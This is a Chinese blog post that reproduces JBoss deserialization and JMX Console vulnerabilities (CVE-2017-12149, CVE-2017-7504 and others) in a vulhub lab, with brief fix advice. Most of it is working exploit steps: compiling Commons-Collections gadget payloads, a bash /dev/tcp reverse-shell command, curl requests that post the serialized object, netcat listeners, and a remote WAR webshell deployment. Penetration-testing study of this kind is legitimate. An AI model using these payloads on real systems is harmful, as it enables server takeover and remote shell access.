# jboss常见漏洞复现


### JBoss 5.x/6.x 反序列化漏洞( CVE-2017-12149 )
**验证：** 访问`/invoker/readonly`，如果返回 500 ,说明页面存在,此页面存在反序列化漏洞。
![](http://image.xpshuai.cn/jboss_500.png)

利用工具：[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)
**步骤：**
1.先编译

```bash
# 我们选择一个 Gadget : ReverseShellCommonsCollectionsHashMap ,编译并生成序列化数据
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

2.设置反弹的IP和端口：

```bash
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.105:8888 # ip 是 nc 所在的 ip 
# 这样就会将序列化对象保存在ReverseShellCommonsCollectionsHashMap.ser中，用curl命令发送到Jboss服务地址
```

3.本机进行监听
```bash
nv -lvvp 8888
```

4.再打开另一个控制台，运行如下curl命令
```bash
curl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

5.成功反弹shell




### JBoss JMXInvokerServlet 反序列化漏洞
**验证：**  访问 `/invoker/JMXInvokerServlet`，返回如下,说明接口开放,此接口存在反序列化漏洞。
![](http://image.xpshuai.cn/JBossEJBInvokerServlet1.png)

这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/JMXInvokerServlet`接口中。

也可以直接利用工具检测：[工具下载地址](https://cdn.vulhub.org/deserialization/DeserializeExploit.jar)
```bash
# 运行工具即可
java -jar DeserializeExploit.jar
```


### JBoss EJBInvokerServlet 反序列化漏洞
**验证：** 访问     /invoker/EJBInvokerServlet    返回如下,说明接口开放,此接口存在反序列化漏洞。
![](http://image.xpshuai.cn/JBossEJBInvokerServlet.png)

这里直接利用 CVE-2017-12149 生成的 ser ,发送到 `/invoker/EJBInvokerServlet` 接口中


### 修复建议
1. 不需要`ttp-invoker.sar`组件的用户可直接删除此组件
2. 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中,对 http invoker 组件进行访问控制:`<url-pattern>/*</url-pattern>`




### JBoss <=4.x JBossMQ JMS 反序列化漏洞( CVE-2017-7504 )
利用工具：[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)
**步骤：**
1.先编译
```bash
# 选择ExampleCommonsCollections1WithHashMap，编译并生成序列化数据
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java   #编译 
```

2.设置反弹的IP和端口：
```bash
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.0.105/1234 0>&1"       #ser全称serialize，序列化恶意数据至文件。
```

3.本机进行监听
```bash
nv -lvvp 1234
```

4.再打开另一个控制台，运行如下curl命令
```bash
#该ser文件作为请求数据主体发送如下数据包
curl http://192.168.0.100:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser  # --data-binary 意为以二进制的方式post数据
```

5.成功反弹shell



### JMX Console 未授权访问
###### 漏洞描述
未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。

###### 环境搭建
使用vulhub
```bash
cd vulhub/jboss/CVE-2017-7504/
docker-compose up -d

# 浏览器访问
```



###### 复现
1.未授权访问测试（无无需认证进入入控制⻚页面面）
```
http://192.168.0.100:8080/
# 进入控制页 JMX Console
http://192.168.0.100:8080/jmx-console/ 
```
![](http://image.xpshuai.cn/jmx_console.png)

2.点击`jboss.deployment`进入应用部署页面
![](http://image.xpshuai.cn/jboss_deployment.png)

3.使用apache搭建远程木马服务器(这里在kali上搭建)

```bash
# war马的制作方式：https://www.peekeyes.com/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/
jar cvf shell.war shell.jsp
```

4.通过addurl参数进行木马的远程部署

```
地址写远程服务器war马的地址
```
![](http://image.xpshuai.cn/jboss_war.png)

成功部署
![](http://image.xpshuai.cn/jboss_war_ok.png)

5.连接木马

```
http://192.168.0.100:8080/shell/shell.jsp
```
![](http://image.xpshuai.cn/jboss_war_connect.png)




###### 防护
- 对jmx控制页面访问添加访问验证。
- 进行JMX Console 安全配置。






---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/  

